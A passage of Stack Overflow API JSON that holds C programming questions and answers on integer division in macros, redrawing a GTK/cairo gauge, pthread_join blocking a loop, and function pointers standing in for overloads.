"https://stackoverflow.com/questions/44680242/divide-by-zero-warning-results-in-wrong-value-in-constant-calculation/44680304#44680304", "title": "Divide by zero warning results in wrong value in constant calculation", "body": "<p>The integer division is probably returning a number less than 1 at some point, and it's being truncated to 0.</p>\n\n<p>Try forcing floating-point division by making one of the constants a double:</p>\n\n<pre><code>// The .0 should \"infect\" the other numbers\n#define PULSE_FREQ 150.0\n#define TC_FREQ (60000000 / 8)                  \n#define PULSE_PER (1 / PULSE_FREQ)\n#define TC_PER (1 / TC_FREQ)\n#define TTC ((PULSE_PER / TC_PER) - 1)\n</code></pre>\n"}], "owner": {"reputation": 63, "user_id": 4764589, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6cb027cded9a764f9ec02ef0d0d322f5?s=128&d=identicon&r=PG", "display_name": "mdszy", "link": "https://stackoverflow.com/users/4764589/mdszy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 42, "favorite_count": 0, "closed_date": 1498058881, "accepted_answer_id": 44680304, "answer_count": 1, "score": 0, "last_activity_date": 1498059951, "creation_date": 1498058595, "last_edit_date": 1498058790, "question_id": 44680242, "link": "https://stackoverflow.com/questions/44680242/divide-by-zero-warning-results-in-wrong-value-in-constant-calculation", "closed_reason": "Duplicate", "title": "Divide by zero warning results in wrong value in constant calculation", "body": "<p>I have the following code in a header file for an AVR32 program I'm writing:</p>\n\n<pre><code>#define PULSE_FREQ 150\n#define TC_FREQ (60000000 / 8)                  \n#define PULSE_PER (1 / PULSE_FREQ)\n#define TC_PER (1 / TC_FREQ)\n#define TTC ((PULSE_PER / TC_PER) - 1)\n</code></pre>\n\n<p>The goal is to be able to give a frequency and calculate the constant timer count value given by this formula:</p>\n\n<pre><code>Target Count = ((1 / Target Frequency) / (1 / Timer Frequency)) - 1\n</code></pre>\n\n<p>For example, for a timer frequency of 150Hz, a timer count value of 49999 is required. When manually entering that value for the timer, it works and gives a frequency of 150Hz. However, when using the code above, I get a frequency of 57Hz.</p>\n\n<p>I'm also getting warnings about a division by zero, could the numbers in the constants be so small that they're getting chopped off to zero?</p>\n\n<p>Would it be better to go about this at runtime instead of with <code>#define</code> macros?</p>\n"}, {"tags": ["c", "gtk", "gtk3", "cairo", "gauge"], "answers": [{"comments": [{"owner": {"reputation": 55, "user_id": 7164810, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44b03848c82bf75ecd767f01708d6842?s=128&d=identicon&r=PG&f=1", "display_name": "R. Rodrigues", "link": "https://stackoverflow.com/users/7164810/r-rodrigues"}, "edited": false, "score": 0, "creation_date": 1498121118, "post_id": 44682078, "comment_id": 76371981, "body": "Thanks! The problem is that my scroll window is set to expand, and i thought that don&#39;t causes any problem. To redraw i need to send some data, like i send in draw event, how can i make in draw update??"}, {"owner": {"reputation": 55, "user_id": 7164810, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44b03848c82bf75ecd767f01708d6842?s=128&d=identicon&r=PG&f=1", "display_name": "R. Rodrigues", "link": "https://stackoverflow.com/users/7164810/r-rodrigues"}, "edited": false, "score": 0, "creation_date": 1498121172, "post_id": 44682078, "comment_id": 76372021, "body": "Do you have any example how to create a simple custom widget with cairo?"}, {"owner": {"reputation": 3671, "user_id": 7728864, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hv4Sl.jpg?s=128&g=1", "display_name": "Jos&#233; Fonte", "link": "https://stackoverflow.com/users/7728864/jos%c3%a9-fonte"}, "reply_to_user": {"reputation": 55, "user_id": 7164810, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44b03848c82bf75ecd767f01708d6842?s=128&d=identicon&r=PG&f=1", "display_name": "R. Rodrigues", "link": "https://stackoverflow.com/users/7164810/r-rodrigues"}, "edited": false, "score": 0, "creation_date": 1498127019, "post_id": 44682078, "comment_id": 76376355, "body": "@R.Rodrigues You must have the values that the drawing_area represents outside the draw callback. Let&#39;s say you have the percentage. Now, somewhere in your business logic, you need to update that value, so you do percentage = x, then you can issue a gtk_widget_queue_draw and the draw method will take that value and redraw to the actual new value. There is a lot of information scattered on the internet about creating custom gtk widgets. Most are for Gtk2. Check <a href=\"https://developer.gnome.org/gtkmm-tutorial/stable/sec-custom-widgets.html.en\" rel=\"nofollow noreferrer\">this for c++</a>"}, {"owner": {"reputation": 3671, "user_id": 7728864, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hv4Sl.jpg?s=128&g=1", "display_name": "Jos&#233; Fonte", "link": "https://stackoverflow.com/users/7728864/jos%c3%a9-fonte"}, "reply_to_user": {"reputation": 55, "user_id": 7164810, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44b03848c82bf75ecd767f01708d6842?s=128&d=identicon&r=PG&f=1", "display_name": "R. Rodrigues", "link": "https://stackoverflow.com/users/7164810/r-rodrigues"}, "edited": false, "score": 0, "creation_date": 1498127488, "post_id": 44682078, "comment_id": 76376689, "body": "@R.Rodrigues or <a href=\"http://zetcode.com/gui/gtk2/customwidget/\" rel=\"nofollow noreferrer\">this for Gtk2/C</a> and <a href=\"http://djcj.org/gtk/\" rel=\"nofollow noreferrer\">also this</a> or <a href=\"https://github.com/phastmike/vala-circular-progress-bar\" rel=\"nofollow noreferrer\">this in Vala</a>"}, {"owner": {"reputation": 55, "user_id": 7164810, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44b03848c82bf75ecd767f01708d6842?s=128&d=identicon&r=PG&f=1", "display_name": "R. Rodrigues", "link": "https://stackoverflow.com/users/7164810/r-rodrigues"}, "edited": false, "score": 0, "creation_date": 1498127551, "post_id": 44682078, "comment_id": 76376726, "body": "Yes, i see for gtk2 but not for gtk3.. and this one is for c++ not c :("}, {"owner": {"reputation": 3671, "user_id": 7728864, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hv4Sl.jpg?s=128&g=1", "display_name": "Jos&#233; Fonte", "link": "https://stackoverflow.com/users/7728864/jos%c3%a9-fonte"}, "reply_to_user": {"reputation": 55, "user_id": 7164810, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44b03848c82bf75ecd767f01708d6842?s=128&d=identicon&r=PG&f=1", "display_name": "R. Rodrigues", "link": "https://stackoverflow.com/users/7164810/r-rodrigues"}, "edited": false, "score": 0, "creation_date": 1498127710, "post_id": 44682078, "comment_id": 76376825, "body": "C custom widgets get quite verbose, take the last vala example and generate the C code and continue from there. Anyway, that is another question. Feel free to ask more questions. Boa sorte"}, {"owner": {"reputation": 55, "user_id": 7164810, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44b03848c82bf75ecd767f01708d6842?s=128&d=identicon&r=PG&f=1", "display_name": "R. Rodrigues", "link": "https://stackoverflow.com/users/7164810/r-rodrigues"}, "edited": false, "score": 0, "creation_date": 1498129477, "post_id": 44682078, "comment_id": 76377964, "body": "Thanks for helping!"}, {"owner": {"reputation": 55, "user_id": 7164810, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44b03848c82bf75ecd767f01708d6842?s=128&d=identicon&r=PG&f=1", "display_name": "R. Rodrigues", "link": "https://stackoverflow.com/users/7164810/r-rodrigues"}, "edited": false, "score": 0, "creation_date": 1498131238, "post_id": 44682078, "comment_id": 76379160, "body": "Do you now how to update this code <a href=\"http://zetcode.com/gui/gtk2/customwidget/\" rel=\"nofollow noreferrer\">zetcode.com/gui/gtk2/customwidget</a> to GTK3? I&#39;m sorry, but i can&#39;t open another question.."}, {"owner": {"reputation": 3671, "user_id": 7728864, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hv4Sl.jpg?s=128&g=1", "display_name": "Jos&#233; Fonte", "link": "https://stackoverflow.com/users/7728864/jos%c3%a9-fonte"}, "reply_to_user": {"reputation": 55, "user_id": 7164810, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44b03848c82bf75ecd767f01708d6842?s=128&d=identicon&r=PG&f=1", "display_name": "R. Rodrigues", "link": "https://stackoverflow.com/users/7164810/r-rodrigues"}, "edited": false, "score": 0, "creation_date": 1498131413, "post_id": 44682078, "comment_id": 76379289, "body": "@R.Rodrigues Check <a href=\"http://djcj.org/gtk/code/\" rel=\"nofollow noreferrer\">this one instead</a> I think its Gtk3 already (At least the author claims it to be, haven&#39;t looked though)."}, {"owner": {"reputation": 55, "user_id": 7164810, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44b03848c82bf75ecd767f01708d6842?s=128&d=identicon&r=PG&f=1", "display_name": "R. Rodrigues", "link": "https://stackoverflow.com/users/7164810/r-rodrigues"}, "edited": false, "score": 1, "creation_date": 1498208903, "post_id": 44682078, "comment_id": 76417039, "body": "Thanks, it works! Now i will see if i understand and make my custom widget. Obrigado!"}], "tags": [], "owner": {"reputation": 3671, "user_id": 7728864, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hv4Sl.jpg?s=128&g=1", "display_name": "Jos&#233; Fonte", "link": "https://stackoverflow.com/users/7728864/jos%c3%a9-fonte"}, "is_accepted": true, "score": 2, "last_activity_date": 1498064810, "last_edit_date": 1498064810, "creation_date": 1498064302, "answer_id": 44682078, "question_id": 44679766, "link": "https://stackoverflow.com/questions/44679766/how-redraw-text-with-cairo-using-gtk/44682078#44682078", "title": "How redraw text with cairo using gtk+", "body": "<p>Answer to</p>\n\n<p><strong>1)</strong> Everytime you update data, force a draw update with: </p>\n\n<pre><code>gtk_widget_queue_draw(GTK_WIDGET(drawing_area))\n</code></pre>\n\n<p><strong>2)</strong> You can request a size but if the container is set to expand, then the widget can eventually expand; the set_size_request function/method will set the minimum size the drawing area will \"have\". From what we can see on your code, the drawing area is inside a GtkBox. Check the expand and fill flags.</p>\n\n<p>Tip 1: You can test the set_size_request by using your drawing_area inside a GtkFixed container</p>\n\n<p>Tip 2: Try to create a custom widget, it would be a better solution.</p>\n"}], "owner": {"reputation": 55, "user_id": 7164810, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/44b03848c82bf75ecd767f01708d6842?s=128&d=identicon&r=PG&f=1", "display_name": "R. Rodrigues", "link": "https://stackoverflow.com/users/7164810/r-rodrigues"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 874, "favorite_count": 0, "accepted_answer_id": 44682078, "answer_count": 1, "score": 1, "last_activity_date": 1498064810, "creation_date": 1498057379, "question_id": 44679766, "link": "https://stackoverflow.com/questions/44679766/how-redraw-text-with-cairo-using-gtk", "title": "How redraw text with cairo using gtk+", "body": "<p>I'm using cairo to draw some circular widget like <a href=\"https://1.bp.blogspot.com/-CBwOUzGthXs/VFJpeh3GLtI/AAAAAAAABnA/wgtvR57r0r0/s1600/Monosnap%2B2014-10-30%2B17-31-16.png\" rel=\"nofollow noreferrer\">this</a>.</p>\n\n<p>I used \"draw\" event of drawing area to draw all of the widget, but i don't know how to update data in the widget.\nThis is the code that i make:</p>\n\n<pre><code>gboolean hald_circular_gauge (GtkWidget *widget,cairo_t *cr, gdouble max, gdouble min, gdouble value, gchar *pcname ,gchar *unit){\n\ncairo_text_extents_t extents, extentsTemp, extentsLabel, extentsTempMin, extentsTempMax;\n  int width, height;\n  gint percentage, linewidth;\n  double x,y;\n  gdouble declive = (360.0-180.0)/(max-min);\n  gdouble origin = 180.0 - declive*min;\n  gchar pcTemp[BUFSIZ];\n\n  width = gtk_widget_get_allocated_width (widget);\n  height = gtk_widget_get_allocated_height (widget);\n\n\n\n  double angle1 = 180.0  * (M_PI/180.0);  /* angles are specified */\n  double angle2 = 360.0 * (M_PI/180.0);  /* in radians           */\n\n  if(min &gt; value || value &gt;max)\n      return FALSE;\n\n  linewidth = (MIN (width, height) / 2.0 * 30.0) / 100.0;\n\n  cairo_set_source_rgba (cr, 1.0, 1.0, 1.0, 0.6);\n  cairo_set_line_width (cr, linewidth);\n  cairo_arc(cr, width/2.0, height/2.0,  MIN (width, height) / 2.0 - linewidth, angle1, angle2);\n  cairo_stroke (cr);\n\n  cairo_set_source_rgba (cr, 0.0, 0.9, 0.0, 1.0);\n  cairo_set_line_width (cr, linewidth);\n  cairo_arc(cr, width/2.0, height/2.0, MIN (width, height) / 2.0  - linewidth, 180.0  * (M_PI/180.0),(declive*value+origin)  * (M_PI/180.0) );\n  cairo_stroke (cr);\n\n  cairo_select_font_face (cr, \"Roboto Thin\", CAIRO_FONT_SLANT_NORMAL,\n          CAIRO_FONT_WEIGHT_NORMAL);\n  cairo_set_font_size (cr, linewidth);\n  cairo_set_source_rgb (cr, 1.0, 1.0, 1);\n  cairo_text_extents (cr, unit, &amp;extents);\n  x = width/2.0-(extents.width/2 + extents.x_bearing);\n  y = height/2.0 - (extents.height/2 );\n  cairo_move_to (cr, x, y);\n  cairo_show_text (cr, unit);\n\n  cairo_select_font_face (cr, \"Roboto\", CAIRO_FONT_SLANT_NORMAL,\n              CAIRO_FONT_WEIGHT_BOLD);\n  cairo_set_font_size (cr, linewidth*1.3);\n  sprintf(pcTemp,\"%.1f\",value);\n  cairo_text_extents (cr, pcTemp, &amp;extentsTemp);\n      x = width/2.0-(extentsTemp.width/2 + extentsTemp.x_bearing);\n      y = height/2.0 - extentsTemp.y_bearing;\n  cairo_move_to (cr, x, y);\n  cairo_show_text (cr, pcTemp);\n\n  cairo_select_font_face (cr, \"Roboto Thin\", CAIRO_FONT_SLANT_NORMAL,\n                  CAIRO_FONT_WEIGHT_NORMAL);\n  cairo_set_font_size (cr, linewidth);\n  cairo_text_extents (cr, pcname, &amp;extentsLabel);\n      x = width/2.0-(extentsLabel.width/2 + extentsLabel.x_bearing);\n      y = height/2.0 - extentsTemp.y_bearing  - extentsLabel.y_bearing*1.20;\n  cairo_move_to (cr, x, y);\n  cairo_show_text (cr, pcname);\n\n\n  cairo_select_font_face (cr, \"Roboto Thin\", CAIRO_FONT_SLANT_NORMAL,\n                      CAIRO_FONT_WEIGHT_NORMAL);\n  cairo_set_font_size (cr, linewidth*0.5);\n  sprintf(pcTemp,\"%.1f\",min);\n  cairo_text_extents (cr, pcTemp, &amp;extentsTempMin);\n      x = width/2.0  - MIN (width, height) / 2.0 + linewidth - (extentsTempMin.width/2 + extentsTempMin.x_bearing);\n      y = height/2.0 - extentsTempMin.y_bearing*1.20;\n  cairo_move_to (cr, x, y);\n  cairo_show_text (cr, pcTemp);\n\n\n  cairo_select_font_face (cr, \"Roboto Thin\", CAIRO_FONT_SLANT_NORMAL,\n                      CAIRO_FONT_WEIGHT_NORMAL);\n      cairo_set_font_size (cr, linewidth*0.5);\n      sprintf(pcTemp,\"%.1f\",max);\n      cairo_text_extents (cr, pcTemp, &amp;extentsTempMax);\n          x = width/2.0  + MIN (width, height) / 2.0 - linewidth + (-extentsTempMax.width/2 + extentsTempMax.x_bearing);\n          y = height/2.0 - extentsTempMax.y_bearing*1.20;\n      cairo_move_to (cr, x, y);\n      cairo_show_text (cr, pcTemp);\n    return TRUE;\n }\n</code></pre>\n\n<p>and the result is <a href=\"https://imagebin.ca/v/3QkZQvctZd6f\" rel=\"nofollow noreferrer\">this</a></p>\n\n<pre><code> GtkWidget *drawing_area = gtk_drawing_area_new ();\n     gtk_widget_set_size_request (drawing_area, 100, 100);\n     gtk_box_pack_start (GTK_BOX(gtk_builder_get_object(builder, \"box30\")),drawing_area,FALSE,TRUE,0);\n</code></pre>\n\n<p>I create a drawing area and request the size, but i don't get this size. \nSo my question are:</p>\n\n<ul>\n<li><p>How can i update data inside a drawing area (generate a draw event??)?</p></li>\n<li><p>Why i can't request a size of the drawing area widget?</p></li>\n</ul>\n\n<p>Opinions are welcome.</p>\n"}, {"tags": ["c", "multithreading"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 5, "creation_date": 1498057095, "post_id": 44679608, "comment_id": 76343542, "body": "Do you know what <code>pthread_join</code> does?"}, {"owner": {"reputation": 692, "user_id": 3098124, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/KCsxV.jpg?s=128&g=1", "display_name": "MrJman006", "link": "https://stackoverflow.com/users/3098124/mrjman006"}, "edited": false, "score": 0, "creation_date": 1498057232, "post_id": 44679608, "comment_id": 76343682, "body": "pthread_join will never resume because your original thread will never terminate"}, {"owner": {"reputation": 23612, "user_id": 147407, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/65f858d8a973f4ee8d97517a21a17e7d?s=128&d=identicon&r=PG", "display_name": "Andrejs Cainikovs", "link": "https://stackoverflow.com/users/147407/andrejs-cainikovs"}, "edited": false, "score": 0, "creation_date": 1498057389, "post_id": 44679608, "comment_id": 76343802, "body": "&quot;... and the compiler simply does not read the code after creating the thread&quot; - Now that&#39;s a twist."}], "answers": [{"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 8, "last_activity_date": 1498057195, "creation_date": 1498057195, "answer_id": 44679694, "question_id": 44679608, "link": "https://stackoverflow.com/questions/44679608/how-to-make-two-simultaneously-running-infinite-loops-in-c/44679694#44679694", "title": "How to make two simultaneously running infinite loops in C?", "body": "<p>The <code>pthread_join</code> function tells the calling thread to wait until the given thread finishes.  Since the thread you start never ends, <code>main</code> waits forever.</p>\n\n<p>Get rid of that function to allow the main thread to continue after starting the child thread.</p>\n\n<pre><code>int main()\n{\n    pthread_t tid;\n\n    pthread_create(&amp;tid, NULL, thread);\n\n    while (1)\n    {\n        // some code\n    }\n\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 23, "user_id": 8194803, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/40dd7f8f839727ef670a32d9a65b752e?s=128&d=identicon&r=PG&f=1", "display_name": "QArt", "link": "https://stackoverflow.com/users/8194803/qart"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 257, "favorite_count": 0, "accepted_answer_id": 44679694, "answer_count": 1, "score": 1, "last_activity_date": 1498070415, "creation_date": 1498056984, "last_edit_date": 1498070415, "question_id": 44679608, "link": "https://stackoverflow.com/questions/44679608/how-to-make-two-simultaneously-running-infinite-loops-in-c", "title": "How to make two simultaneously running infinite loops in C?", "body": "\n\n<p>It is necessary that the two cycles work simultaneously and at the same time be infinite. I previously did this in Java and Python, but when I tried to do this in C I encountered a problem.</p>\n\n<p>If I do this in Java:</p>\n\n<pre class=\"lang-java prettyprint-override\"><code>public static void main(String[] args)\n{\n    new Thread(new Runnable()\n    {\n        @Override\n        public void run()\n        {\n            while (true)\n            {\n                // some code\n            }\n        }\n    }).start();\n\n    while (true)\n    {\n        // some code\n    }\n}\n</code></pre>\n\n<p>Or in Python:</p>\n\n<pre class=\"lang-python prettyprint-override\"><code>def thread():\n    while True:\n        # some code\n\ndef main():\n    t = threading.Thread(target = thread)\n    t.start()\n\n    while True:\n        # some code\n\nif __name__ == '__main__':\n    main()\n</code></pre>\n\n<p>All ok, but when I do this in C:</p>\n\n<pre class=\"lang-c prettyprint-override\"><code>void *thread(void *args)\n{\n    while (1)\n    {\n        // some code\n    }\n}\n\nint main()\n{\n    pthread_t tid;\n\n    pthread_create(&amp;tid, NULL, thread);\n    pthread_join(tid, NULL);\n\n    while (1)\n    {\n        // some code\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>Only the loop in the thread runs and the compiler simply does not read the code after creating the thread.. So how to do this?</p>\n"}, {"tags": ["c", "class", "function-pointers"], "comments": [{"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "edited": false, "score": 1, "creation_date": 1498057051, "post_id": 44679602, "comment_id": 76343505, "body": "That won&#39;t compile as you can&#39;t have two members of a struct with the same name in C"}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 1, "creation_date": 1498057193, "post_id": 44679602, "comment_id": 76343639, "body": "There are no overloaded functions in C. <code>BitMask &amp; self</code> is not a valid C declaration. Perhaps you are studying the wrong language."}, {"owner": {"reputation": 44802, "user_id": 2752075, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5oQlf.png?s=128&g=1", "display_name": "HolyBlackCat", "link": "https://stackoverflow.com/users/2752075/holyblackcat"}, "edited": false, "score": 1, "creation_date": 1498057281, "post_id": 44679602, "comment_id": 76343720, "body": "This is obviously C++. You need to change the tag."}, {"owner": {"reputation": 1001, "user_id": 1105597, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/1188d52b855ceb13de5764c88333247d?s=128&d=identicon&r=PG", "display_name": "Jury", "link": "https://stackoverflow.com/users/1105597/jury"}, "edited": false, "score": 0, "creation_date": 1498057515, "post_id": 44679602, "comment_id": 76343886, "body": "My mistake in code sample. Replacing <code>&amp;</code> to <code>*</code> - in this context it doesn&#39;t matter"}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1498057528, "post_id": 44679602, "comment_id": 76343899, "body": "In C++, you probably would declare methods instead of function pointers. It&#39;s kind of a phantasy language, trying to <i>do C++ in C</i>. But C doesn&#39;t know <i>references</i>, to start with."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1498058827, "post_id": 44679602, "comment_id": 76344918, "body": "@Jury Did you want to compile this code with a C compiler <i>or</i> is it C-like code to be complied with a C++ compiler?"}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 1, "creation_date": 1498061474, "post_id": 44679602, "comment_id": 76346753, "body": "There is still no function overloading in C."}], "answers": [{"tags": [], "owner": {"reputation": 6013, "user_id": 3310281, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f9b8b4ec03e2c7a424fdc428eb55f2e8?s=128&d=identicon&r=PG&f=1", "display_name": "Malcolm McLean", "link": "https://stackoverflow.com/users/3310281/malcolm-mclean"}, "is_accepted": false, "score": 0, "last_activity_date": 1498057527, "creation_date": 1498057527, "answer_id": 44679823, "question_id": 44679602, "link": "https://stackoverflow.com/questions/44679602/how-to-distinguish-between-pointers-to-overloaded-functions/44679823#44679823", "title": "How to distinguish between pointers to overloaded functions?", "body": "<p>C++ took over C's function pointer syntax. However with virtual members of classes doing essentially the same thing as a function pointer, you seldom need C style function pointers in C++.</p>\n\n<p>If you have an overloaded function, C++ will resolve by matching the types in the function pointer's argument list.  </p>\n"}, {"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 2, "last_activity_date": 1498057554, "creation_date": 1498057554, "answer_id": 44679833, "question_id": 44679602, "link": "https://stackoverflow.com/questions/44679602/how-to-distinguish-between-pointers-to-overloaded-functions/44679833#44679833", "title": "How to distinguish between pointers to overloaded functions?", "body": "<p>Overloaded functions are not allowed in C.  You also can't have two members of a <code>struct</code> with the same name.</p>\n\n<p>You need to give them each distinct names.  Also, there is no reference operator <code>&amp;</code> in C.  You probably want to pass a pointer.</p>\n\n<pre><code>struct MyClass\n{\n    ...\n    bool (* IsValidByType)(MyClass *self, int type);\n    bool (* IsValidByStr)(MyClass *self, char * str);\n};\n\nbool IsValidMyClassByType(BitMask *self, int mask)\n{\n    ...\n}\nbool IsValidMyClassByStr(BitMask *self, char * str)\n{\n    ...\n}\n\nMyClass BuildMyClass()\n{\n    res.IsValidByType = IsValidMyClassByType;\n    res.IsValidByStr = IsValidMyClassByStr;\n    return res;\n}\n</code></pre>\n"}], "owner": {"reputation": 1001, "user_id": 1105597, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/1188d52b855ceb13de5764c88333247d?s=128&d=identicon&r=PG", "display_name": "Jury", "link": "https://stackoverflow.com/users/1105597/jury"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 49, "favorite_count": 0, "accepted_answer_id": 44679833, "answer_count": 2, "score": -3, "last_activity_date": 1498057554, "creation_date": 1498056965, "last_edit_date": 1498057538, "question_id": 44679602, "link": "https://stackoverflow.com/questions/44679602/how-to-distinguish-between-pointers-to-overloaded-functions", "title": "How to distinguish between pointers to overloaded functions?", "body": "<p>I have a <code>class</code></p>\n\n<pre><code>struct MyClass\n{\n    ...\n    bool (* IsValid)(MyClass * self, int type);\n    bool (* IsValid)(MyClass * self, char * str);\n};\n</code></pre>\n\n<p>relevant functions</p>\n\n<pre><code>bool IsValidMyClass(BitMask * self, int mask)\n{\n    ...\n}\nbool IsValidMyClass(BitMask * self, char * str)\n{\n    ...\n}\n</code></pre>\n\n<p>and a <code>CTOR</code>-like function</p>\n\n<pre><code>MyClass BuildMyClass()\n{\n    res.IsValid = IsValidMyClass; //(MyClass * self, int type);\n    res.IsValid = IsValidMyClass; //(MyClass * self, char * str);\n    return res;\n}\n</code></pre>\n\n<p>And here I got in confuse - how to say to compiler to do a correct assignment?</p>\n"}, {"tags": ["c++", "c", "c++11"], "comments": [{"owner": {"reputation": 374829, "user_id": 734069, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a356923f858fbe363dad1dc566837fc6?s=128&d=identicon&r=PG", "display_name": "Nicol Bolas", "link": "https://stackoverflow.com/users/734069/nicol-bolas"}, "reply_to_user": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "edited": false, "score": 1, "creation_date": 1498056499, "post_id": 44679361, "comment_id": 76342995, "body": "@tilz0R: The user is asking about interfacing with C code. That involves knowing about C code."}, {"owner": {"reputation": 1206, "user_id": 3047822, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/RDyN1.png?s=128&g=1", "display_name": "apramc", "link": "https://stackoverflow.com/users/3047822/apramc"}, "edited": false, "score": 0, "creation_date": 1498056506, "post_id": 44679361, "comment_id": 76343003, "body": "I am calling a API that is written in C from a c++ code"}, {"owner": {"reputation": 8847, "user_id": 3484570, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/r5BRZ.png?s=128&g=1", "display_name": "nwp", "link": "https://stackoverflow.com/users/3484570/nwp"}, "edited": false, "score": 0, "creation_date": 1498056509, "post_id": 44679361, "comment_id": 76343009, "body": "The pointer you gave <code>unique_ptr</code> to <code>delete</code> later is not the pointer that was allocated. Also using <code>delete</code> when you were supposed to use <code>free</code> is not correct."}, {"owner": {"reputation": 32126, "user_id": 2666289, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/746dd23bbe20769fbd758421e67f455c?s=128&d=identicon&r=PG", "display_name": "Holt", "link": "https://stackoverflow.com/users/2666289/holt"}, "edited": false, "score": 0, "creation_date": 1498056580, "post_id": 44679361, "comment_id": 76343078, "body": "Could you add the declaration of the <code>C</code> function you are trying to call? Is it a <code>int**</code> because it is going to allocate an array of <code>int</code> for you, or is int a <code>int**</code> because it is going to use an array of pointer you allocated before?"}, {"owner": {"reputation": 40276, "user_id": 432358, "user_type": "registered", "accept_rate": 69, "profile_image": "https://i.stack.imgur.com/D931H.png?s=128&g=1", "display_name": "Slava", "link": "https://stackoverflow.com/users/432358/slava"}, "edited": false, "score": 0, "creation_date": 1498056701, "post_id": 44679361, "comment_id": 76343181, "body": "Your question is contradicted: if you pass array, then memory already allocated, if memory is allocated inside C call, then you pass pointer, not array. You need to be more clear."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1498056743, "post_id": 44679361, "comment_id": 76343217, "body": "Still the tag <a href=\"https://stackoverflow.com/questions/tagged/c\">c</a> should be appropriate when the question is about <i>interfacing</i> with C code. Don&#39;t be too quick removing tags."}], "owner": {"reputation": 1206, "user_id": 3047822, "user_type": "registered", "accept_rate": 72, "profile_image": "https://i.stack.imgur.com/RDyN1.png?s=128&g=1", "display_name": "apramc", "link": "https://stackoverflow.com/users/3047822/apramc"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 677, "favorite_count": 0, "closed_date": 1498056570, "answer_count": 0, "score": 2, "last_activity_date": 1498057708, "creation_date": 1498056316, "last_edit_date": 1498057708, "question_id": 44679361, "link": 